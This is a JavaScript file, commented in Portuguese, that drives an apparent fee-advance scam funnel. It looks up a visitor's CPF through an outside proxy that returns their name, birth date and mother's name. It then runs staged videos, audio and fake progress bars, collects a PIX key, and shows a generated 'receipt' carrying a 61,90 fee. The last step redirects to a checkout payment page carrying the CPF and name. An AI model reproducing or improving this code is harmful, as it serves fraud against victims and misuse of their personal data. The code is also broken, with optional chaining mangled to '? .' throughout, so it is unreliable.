// ============================================================
// functions.js — robusto (CPF + Comprovante) [v2 HOTFIX]
// ============================================================

// ------------------------- Helpers --------------------------
const _isHttp = (s) => typeof s === 'string' && /^https?:\/\//i.test(s);
const _isData = (s) => typeof s === 'string' && /^data:image\/[a-zA-Z+.-]+;base64,/i.test(s);
const _isHtml = (s) => typeof s === 'string' && /^\s*</.test(s) && /<(?:!doctype|html)/i.test(s);

// Ajuste: use HTTPS no endpoint para evitar mixed content
const ENDPOINT_BASE = 'https://consultandohoje.ink/apiimg/comprovante.php';

let _comprovanteCache = {
    key: null,
    src: null
};

// Logs globais
window.addEventListener('error', (e) => {
    console.error('JS Error:', e.message, 'em', e.filename + ':' + e.lineno);
});
window.addEventListener('unhandledrejection', (e) => {
    console.error('Promise rejeitada sem catch:', e.reason);
});

// -------------------- Fetch com CORS/proxy ------------------
async function fetchJsonWithCorsFallback(url) {
    const doFetch = async (u) => {
        const r = await fetch(u, {
            headers: {
                'Accept': 'application/json, text/plain, */*'
            }
        });
        if (!r.ok) throw new Error(`HTTP ${r.status}`);
        const ct = r.headers.get('content-type') || '';
        if (ct.includes('application/json')) return r.json();
        const txt = await r.text();
        if (_isHtml(txt)) throw new Error('O endpoint retornou HTML (provável 404/redirect). Verifique a rota do PHP.');
        return JSON.parse(txt);
    };

    try {
        // Se estiver http e a página for https, tenta trocar por https primeiro
        if (location.protocol === 'https:' && /^http:\/\//i.test(url)) {
            url = url.replace(/^http:/i, 'https:');
        }
        return await doFetch(url);
    } catch (err) {
        console.warn('[CORS/Fetch] tentando via proxy:', err.message);
        const proxyUrl = 'https://api.allorigins.win/raw?url=' + encodeURIComponent(url);
        const r2 = await fetch(proxyUrl, {
            headers: {
                'Accept': 'application/json, text/plain, */*'
            }
        });
        if (!r2.ok) throw new Error(`Proxy HTTP ${r2.status}`);
        const txt = await r2.text();
        if (_isHtml(txt)) throw new Error('Proxy recebeu HTML do servidor (provável 404/redirect no PHP).');
        try {
            return JSON.parse(txt);
        } catch (e2) {
            console.error('[Proxy] Falha ao parsear JSON:', e2, 'RAW=', txt.slice(0, 200));
            throw err;
        }
    }
}

// --------------- Extrator de imagem do JSON ----------------
function extractImageSrcFromJson(json) {
    if (!json || typeof json !== 'object') return null;
    const paths = [
        ['data', 'image'],
        ['image'],
        ['url'],
        ['link'],
        ['data', 'url'],
        ['data', 'link'],
        ['src'], // PHP envia "src"
    ];
    for (const p of paths) {
        let v = json;
        for (const k of p) v = v ? .[k];
        if (typeof v === 'string') {
            const s = v.trim();
            if (_isHttp(s) || _isData(s)) return s;
        }
    }
    const str = JSON.stringify(json);
    const mHttp = str.match(/https?:\/\/[^"']+\.(?:png|jpe?g|webp|gif)/i);
    if (mHttp) return mHttp[0];
    const mData = str.match(/data:image\/[a-zA-Z+.-]+;base64,[A-Za-z0-9+/=]+/);
    return mData ? mData[0] : null;
}

// --------- Util: pega cpf/name mesmo se faltarem ------------
function getCpfAndNameFromStorage() {
    let cpf = (localStorage.getItem('cpf') || '').replace(/\D/g, '');
    let name = (localStorage.getItem('name') || '').trim();

    if ((!cpf || !name) && localStorage.getItem('dadosBasicos')) {
        try {
            const db = JSON.parse(localStorage.getItem('dadosBasicos'));
            const c2 = (db ? .dadosBasicos ? .cpf || '').toString().replace(/\D/g, '');
            const n2 = (db ? .dadosBasicos ? .nome || '').toString().trim();
            if (!cpf && c2) cpf = c2;
            if (!name && n2) name = n2;
        } catch (_) {}
    }
    return {
        cpf,
        name
    };
}

// ----------------- Gera/obtém comprovante ------------------
async function prefetchComprovante() {
    const {
        cpf,
        name
    } = getCpfAndNameFromStorage();
    const dataHoje = new Date().toLocaleDateString('pt-BR'); // dd/mm/aaaa
    const tax = '61,90';

    const cacheKey = `${cpf}|${name}|${dataHoje}|${tax}`;
    if (_comprovanteCache.key === cacheKey && _comprovanteCache.src) {
        return _comprovanteCache.src;
    }

    // Use HTTPS e force out=json
    const qs = new URLSearchParams({
        cpf,
        name,
        data: dataHoje,
        tax,
        out: 'json',
        format: 'png'
    });
    const endpoint = `${ENDPOINT_BASE}?${qs.toString()}`;
    console.log('[Comprovante] webhook:', endpoint);

    const json = await fetchJsonWithCorsFallback(endpoint);
    console.log('[Comprovante] resposta JSON:', json);

    if (json && json.ok === false) {
        throw new Error(json.error || 'Backend retornou erro.');
    }
    const src = extractImageSrcFromJson(json);
    if (!src) throw new Error('JSON sem URL/BASE64 de imagem');

    _comprovanteCache = {
        key: cacheKey,
        src
    };
    return src;
}

// --------------- Exibe no Step 14 com skeleton -------------
async function showComprovante() {
    try {
        const step14 = document.getElementById('step14') || document.body;
        const container =
            step14.querySelector('.relative') ||
            step14.querySelector('[data-comprovante-container]') ||
            step14;

        let skeleton = document.getElementById('comprovanteSkeleton');
        if (!skeleton) {
            skeleton = document.createElement('div');
            skeleton.id = 'comprovanteSkeleton';
            skeleton.className = 'w-full h-64 bg-gray-200 animate-pulse rounded-xl';
            container.appendChild(skeleton);
        }
        skeleton.classList.remove('hidden');

        let img = document.getElementById('comprovanteImg');
        if (!img) {
            img = document.createElement('img');
            img.id = 'comprovanteImg';
            img.className = 'hidden w-full h-auto rounded-lg shadow-sm';
            img.alt = 'Gerando comprovante...';
            container.appendChild(img);
        }
        img.classList.add('hidden');
        img.removeAttribute('src');

        const oldWarn = document.getElementById('comprovanteError');
        if (oldWarn) oldWarn.remove();

        const src = await prefetchComprovante();

        await new Promise((resolve, reject) => {
            const probe = new Image();
            probe.decoding = 'async';
            probe.onload = resolve;
            probe.onerror = reject;
            probe.src = src;
        });

        img.src = _isHttp(src) ? src + (src.includes('?') ? '&' : '?') + 't=' + Date.now() : src;
        img.alt = 'Comprovante gerado';
        img.loading = 'eager';
        img.decoding = 'sync';

        img.classList.remove('hidden');
        skeleton.classList.add('hidden');
        console.log('[Comprovante] imagem exibida');
    } catch (e) {
        console.error('[Comprovante] falhou:', e);
        const step14 = document.getElementById('step14') || document.body;

        let warn = document.getElementById('comprovanteError');
        if (!warn) {
            warn = document.createElement('div');
            warn.id = 'comprovanteError';
            warn.className = 'mt-3 text-sm text-red-700 bg-red-50 border border-red-200 rounded-md p-3';
            step14.appendChild(warn);
        }
        warn.textContent = 'Não foi possível gerar o comprovante agora. Detalhe: ' + (e ? .message || 'erro desconhecido');

        const skeleton = document.getElementById('comprovanteSkeleton');
        if (skeleton) skeleton.classList.add('hidden');

        const img = document.getElementById('comprovanteImg');
        if (img) {
            img.removeAttribute('src');
            img.classList.add('hidden');
        }
    }
}

// ================== Fluxo principal ========================
document.addEventListener('DOMContentLoaded', function() {
    const form = document.querySelector('form');
    const cpfInput = document.getElementById('cpf');
    const step1 = document.getElementById('step1');
    const step2 = document.getElementById('step2');

    // Formata CPF (só se existir #cpf)
    if (cpfInput) {
        cpfInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 11) value = value.slice(0, 11);
            if (value.length > 9) {
                value = value.replace(/^(\d{3})(\d{3})(\d{3})(\d{2}).*/, '$1.$2.$3-$4');
            } else if (value.length > 6) {
                value = value.replace(/^(\d{3})(\d{3})(\d{3}).*/, '$1.$2.$3');
            } else if (value.length > 3) {
                value = value.replace(/^(\d{3})(\d{3}).*/, '$1.$2');
            }
            e.target.value = value;
        });
    }

    // Submit (se existir form nesta página)
    if (form) {
        form.addEventListener('submit', async function(e) {
            e.preventDefault();

            const cpfField = cpfInput ? cpfInput.value.replace(/\D/g, '') : '';
            if (!cpfField || cpfField.length !== 11) {
                alert('Por favor, digite um CPF válido');
                return;
            }

            const submitButton = form.querySelector('button[type="submit"]');
            const originalButtonText = submitButton ? submitButton.innerHTML : '';
            if (submitButton) {
                submitButton.innerHTML = '<div class="loader" style="display:inline-block;"></div> Consultando...';
                submitButton.disabled = true;
            }

            try {
                const url = `https://apionlineconsulta.vercel.app/api/proxy?cpf=${encodeURIComponent(cpfField)}`;
                const data = await fetchJsonWithCorsFallback(url);

                if (!data || !data.dadosBasicos) {
                    console.error('[CPF] JSON inesperado:', data);
                    alert('CPF não encontrado na base de dados.');
                    return;
                }

                localStorage.setItem('dadosBasicos', JSON.stringify(data));
                localStorage.setItem('cpf', String(data.dadosBasicos.cpf || cpfField).replace(/\D/g, ''));
                localStorage.setItem('name', data.dadosBasicos.nome || '');
                localStorage.setItem('nasc', data.dadosBasicos.nascimento || '');
                localStorage.setItem('name_m', data.dadosBasicos.mae || '');

                if (step1) step1.classList.add('hidden');
                if (step2) step2.classList.remove('hidden');

                const nameValue = localStorage.getItem('name') || '';
                const cpfValue = localStorage.getItem('cpf') || cpfField;

                const el = (id, val) => {
                    const x = document.getElementById(id);
                    if (x) x.textContent = val;
                };
                el('nameUser', nameValue);
                el('nameUser2', nameValue);
                el('cpfUser', cpfValue);

                handleTimer();
            } catch (error) {
                alert('Erro ao consultar o CPF. Veja o console para detalhes.');
                console.error('[CPF] Falha na consulta:', error);
            } finally {
                if (submitButton) {
                    submitButton.innerHTML = originalButtonText;
                    submitButton.disabled = false;
                }
            }
        });
    }

    // Se esta página não tem form (ex: finalização), apenas garante header e timer se existirem
    handleTimer();
});

function handleTimer() {
    const nameValue = (localStorage.getItem('name') || '');
    const nameHeaderEl = document.getElementById('nameHeader');
    if (nameHeaderEl) nameHeaderEl.textContent = nameValue;

    const timerElement = document.getElementById('timer');
    const buttonElement = document.getElementById('buttonNext');
    if (!timerElement) return; // nada a fazer nesta página

    let totalSeconds = 100;
    const countdown = setInterval(() => {
        const minutes = Math.floor(totalSeconds / 60);
        const seconds = totalSeconds % 60;
        timerElement.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
        totalSeconds--;
        if (totalSeconds < 0) {
            clearInterval(countdown);
            timerElement.textContent = '00:00';
            buttonElement ? .classList ? .remove('hidden');
        }
    }, 1000);
}

// =================== Vídeos & Steps (inalterado) ===================
// (mantive seus métodos; apenas acrescentei checagens de existência onde já havia)
function playVideo1() {
    const v = document.getElementById('video1');
    const o = document.getElementById('overlay');
    v ? .play();
    o ? .classList ? .add('hidden');
}

function playVideo2() {
    const v = document.getElementById('video2');
    const o = document.getElementById('overlay2');
    v ? .play();
    o ? .classList ? .add('hidden');
}

function step2to3() {
    const s2 = document.getElementById('step2');
    const s3 = document.getElementById('step3');
    s2 ? .classList.add('hidden');
    s3 ? .classList.remove('hidden');
    const v1 = document.getElementById('video1');
    if (v1) {
        try {
            v1.pause();
            v1.muted = true;
            v1.currentTime = 0;
        } catch (_) {}
    }
    const nameValue = localStorage.getItem('name') || '';
    const cpfValue = localStorage.getItem('cpf') || '';
    const el = (id, val) => {
        const x = document.getElementById(id);
        if (x) x.textContent = val;
    };
    el('nameUser2', nameValue);
    el('cpfUser', cpfValue);
    let t = 45 * 60;
    const elT = document.getElementById('timer2');
    const tick = () => {
        const m = Math.floor(t / 60),
            s = t % 60;
        if (elT) elT.textContent = `${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
        if (t > 0) t--;
        else {
            clearInterval(i);
            if (elT) elT.textContent = '00:00:00';
        }
    };
    const i = setInterval(tick, 1000);
}

function step3to4() {
    const a = document.getElementById('step3');
    const b = document.getElementById('step4');
    a ? .classList.add('hidden');
    b ? .classList.remove('hidden');
    setTimeout(() => {
        document.getElementById('button4') ? .classList ? .remove('hidden');
    }, 38000);
}

function step4to5() {
    const a = document.getElementById('step4');
    const b = document.getElementById('step5');
    a ? .classList.add('hidden');
    b ? .classList.remove('hidden');
    const el = (id, val) => {
        const x = document.getElementById(id);
        if (x) x.textContent = val;
    };
    const nameValue = localStorage.getItem('name') || '';
    const cpfValue = localStorage.getItem('cpf') || '';
    const nameM = localStorage.getItem('name_m') || '';
    el('nameUser5', nameValue);
    el('cpfUser5', cpfValue);
    el('nameM5', nameM);
    document.querySelectorAll('.option-btn').forEach((btn) => {
        btn.addEventListener('click', () => {
            if (btn.classList.contains('border-blue-500')) {
                btn.classList.remove('border-blue-500', 'bg-blue-100');
                btn.classList.add('border-gray-200');
            } else {
                document.querySelectorAll('.option-btn').forEach((b) => {
                    b.classList.remove('border-blue-500', 'bg-blue-100');
                    b.classList.add('border-gray-200');
                });
                btn.classList.remove('border-gray-200');
                btn.classList.add('border-blue-500', 'bg-blue-100');
            }
        });
    });
}

function step5to6() {
    const a = document.getElementById('step5');
    const b = document.getElementById('step6');
    a ? .classList.add('hidden');
    b ? .classList.remove('hidden');

    function progressAudio1() {
        const audio = document.getElementById('audio1');
        audio ? .play();
        const bar = document.getElementById('progress-bar-audio1');
        let p = 0;
        const duration = 8000,
            intervalTime = 60,
            inc = 100 / (duration / intervalTime);
        const it = setInterval(() => {
            p += inc;
            if (p >= 100) {
                p = 100;
                clearInterval(it);
            }
            if (bar) bar.style.width = `${p}%`;
        }, intervalTime);
        const t = document.getElementById('actualTime');
        let s = 0,
            full = 8;
        const ti = setInterval(() => {
            if (s >= full) {
                clearInterval(ti);
                return;
            }
            s++;
            const m = Math.floor(s / 60),
                ss = s % 60;
            if (t) t.textContent = `${String(m).padStart(1,'0')}:${String(ss).padStart(2,'0')}`;
        }, 1000);
    }
    progressAudio1();
    setTimeout(() => {
        const s6 = document.getElementById('step6');
        const s7 = document.getElementById('step7');
        s6 ? .classList.add('hidden');
        s7 ? .classList.remove('hidden');
        const bar = document.getElementById('progress-bar');
        const pct = document.getElementById('percent');
        (function() {
            let p = 0;
            const duration = 6000,
                intervalTime = 60,
                inc = 100 / (duration / intervalTime);
            const it = setInterval(() => {
                p += inc;
                if (p >= 100) {
                    p = 100;
                    clearInterval(it);
                }
                if (bar) bar.style.width = `${p}%`;
                if (pct) pct.textContent = `${Math.floor(p)}%`;
            }, intervalTime);
        })();
        setTimeout(() => {
            const s7 = document.getElementById('step7');
            const s8 = document.getElementById('step8');
            s7 ? .classList.add('hidden');
            s8 ? .classList.remove('hidden');
            setTimeout(() => {
                const s8 = document.getElementById('step8');
                const s9 = document.getElementById('step9');
                s8 ? .classList.add('hidden');
                s9 ? .classList.remove('hidden');
                const el = (id, val) => {
                    const x = document.getElementById(id);
                    if (x) x.textContent = val;
                };
                const nameValue = localStorage.getItem('name') || '';
                const cpfValue = localStorage.getItem('cpf') || '';
                el('nameUser9', nameValue);
                el('cpfUser9', cpfValue);
                const buttons = document.querySelectorAll('.pix-btn');
                const input = document.getElementById('pixKey');
                buttons.forEach((btn) => {
                    btn.addEventListener('click', () => {
                        if (input) {
                            input.placeholder = btn.dataset.placeholder;
                            input.type = btn.dataset.type;
                        }
                        buttons.forEach((b) => b.classList.remove('border-green-500', 'bg-green-50', 'text-green-800'));
                        btn.classList.add('border-green-500', 'bg-green-50', 'text-green-800');
                    });
                });
            }, 5000);
        }, 7000);
    }, 10000);
}

function step9to10() {
    const s9 = document.getElementById('step9');
    const s10 = document.getElementById('step10');
    s9 ? .classList.add('hidden');
    s10 ? .classList.remove('hidden');
    const buttons = document.querySelectorAll('.pix-btn');
    const input = document.getElementById('pixKey');
    buttons.forEach((btn) => {
        btn.addEventListener('click', () => {
            if (input) {
                input.placeholder = btn.dataset.placeholder;
                input.type = btn.dataset.type;
            }
            buttons.forEach((b) => b.classList.remove('border-green-500', 'bg-green-50', 'text-green-800'));
            btn.classList.add('border-green-500', 'bg-green-50', 'text-green-800');
        });
    });
    const pixValue = input ? .value || '';
    const tipoSelecionado = document.querySelector('.border-green-500');
    const tipo = tipoSelecionado ? .textContent ? .trim() || 'Desconhecido';
    if (pixValue === '') {
        alert('Por favor, insira uma chave PIX.');
        return;
    }
    localStorage.setItem('chavePix', pixValue);
    localStorage.setItem('tipoPIX', tipo);
    const el = (id, val) => {
        const x = document.getElementById(id);
        if (x) x.textContent = val;
    };
    const nameValue = localStorage.getItem('name') || '';
    const cpfValue = localStorage.getItem('cpf') || '';
    el('nameUser10', nameValue);
    el('cpfUser10', cpfValue);
    el('chavePix10', localStorage.getItem('chavePix') || '');
}

function step10to11() {
    const a = document.getElementById('step10');
    const b = document.getElementById('step11');
    a ? .classList.add('hidden');
    b ? .classList.remove('hidden');
    const el = (id, val) => {
        const x = document.getElementById(id);
        if (x) x.textContent = val;
    };
    el('nameUser11', localStorage.getItem('name') || '');
    el('chavePix11', localStorage.getItem('chavePix') || '');
}

function step10to9() {
    document.getElementById('step10') ? .classList.add('hidden');
    document.getElementById('step9') ? .classList.remove('hidden');
}

function step11to12() {
    const a = document.getElementById('step11');
    const b = document.getElementById('step12');
    a ? .classList.add('hidden');
    b ? .classList.remove('hidden');
    prefetchComprovante().catch((err) => {
        console.warn('[Comprovante] prefetch falhou (vai tentar no step14):', err);
    });

    function progressAudio2() {
        const audio = document.getElementById('audio2');
        audio ? .play();
        const bar = document.getElementById('progress-bar-audio2');
        let p = 0;
        const duration = 19000,
            intervalTime = 60,
            inc = 100 / (duration / intervalTime);
        const it = setInterval(() => {
            p += inc;
            if (p >= 100) {
                p = 100;
                clearInterval(it);
            }
            if (bar) bar.style.width = `${p}%`;
        }, intervalTime);
        const t = document.getElementById('actualTime2');
        let s = 0,
            full = 19;
        const ti = setInterval(() => {
            if (s >= full) {
                clearInterval(ti);
                return;
            }
            s++;
            const m = Math.floor(s / 60),
                ss = s % 60;
            if (t) t.textContent = `${String(m).padStart(1,'0')}:${String(ss).padStart(2,'0')}`;
        }, 1000);
    }
    progressAudio2();
    setTimeout(() => {
        step12to13();
    }, 20000);
}

function step12to13() {
    const a = document.getElementById('step12');
    const b = document.getElementById('step13');
    a ? .classList.add('hidden');
    b ? .classList.remove('hidden');
    (function() {
        const bar = document.getElementById('progress-bar2');
        const pct = document.getElementById('percent2');
        let p = 0;
        const duration = 6000,
            intervalTime = 60,
            inc = 100 / (duration / intervalTime);
        const it = setInterval(() => {
            p += inc;
            if (p >= 100) {
                p = 100;
                clearInterval(it);
            }
            if (bar) bar.style.width = `${p}%`;
            if (pct) pct.textContent = `${Math.floor(p)}%`;
        }, intervalTime);
    })();
    setTimeout(() => {
        step13to14();
    }, 7000);
}

function step13to14() {
    const a = document.getElementById('step13');
    const b = document.getElementById('step14');
    a ? .classList.add('hidden');
    b ? .classList.remove('hidden');
    const el = (id, val) => {
        const x = document.getElementById(id);
        if (x) x.textContent = val;
    };
    el('nameUser14', localStorage.getItem('name') || '');
    el('cpfUser14', (localStorage.getItem('cpf') || ''));
    el('chavePix14', localStorage.getItem('chavePix') || '');
    el('tipoPix14', localStorage.getItem('tipoPIX') || '');
    showComprovante();
    setTimeout(showComprovante, 1000);
}

function step14to15() {
    const a = document.getElementById('step14');
    const b = document.getElementById('step15');
    a ? .classList.add('hidden');
    b ? .classList.remove('hidden');

    function progressAudio3() {
        const audio = document.getElementById('audio3');
        audio ? .play();
        const bar = document.getElementById('progress-bar-audio3');
        let p = 0;
        const duration = 28000,
            intervalTime = 60,
            inc = 100 / (duration / intervalTime);
        const it = setInterval(() => {
            p += inc;
            if (p >= 100) {
                p = 100;
                clearInterval(it);
            }
            if (bar) bar.style.width = `${p}%`;
        }, intervalTime);
        const t = document.getElementById('actualTime3');
        let s = 0,
            full = 28;
        const ti = setInterval(() => {
            if (s >= full) {
                clearInterval(ti);
                return;
            }
            s++;
            const m = Math.floor(s / 60),
                ss = s % 60;
            if (t) t.textContent = `${String(m).padStart(1,'0')}:${String(ss).padStart(2,'0')}`;
        }, 1000);
    }
    progressAudio3();
    setTimeout(() => {
        step15to16();
    }, 30000);
}

function step15to16() {
    document.getElementById('step15') ? .classList.add('hidden');
    document.getElementById('step16') ? .classList.remove('hidden');
}

// ------------------------- Redirect ------------------------
function redirect() {
    const cpf = localStorage.getItem('cpf');
    const name = localStorage.getItem('name');
    const url = `https://pay.checkoutonline.click/JqoR32bY9RA3Vj5?document=${encodeURIComponent(cpf||'')}&name=${encodeURIComponent(name||'')}`;
    window.location.href = url;
}